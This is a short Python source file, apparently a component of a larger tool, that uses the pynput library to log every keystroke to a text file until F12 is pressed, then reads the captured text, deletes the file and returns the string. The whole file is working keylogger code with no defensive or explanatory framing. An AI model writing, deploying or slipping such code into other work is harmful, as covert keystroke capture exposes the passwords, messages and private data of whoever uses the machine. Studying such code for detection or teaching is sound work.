from pynput.keyboard import Listener
import os


def getKey(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        return False
    if key == "Key.space":
        key =" "
    if key == "Key.enter":
        key="\n"
    if key == "Key.tab":
        key="    "
    
    with open("KeyLog.txt","a") as file:
        file.write(key)
    #print(key)

def Key_Log():
    with Listener(on_press = getKey) as listener:
        listener.join()

    key_log_string=""

    with open("KeyLog.txt","r") as file:
        key_log_string=file.read()
    os.remove("KeyLog.txt")
    return key_log_string




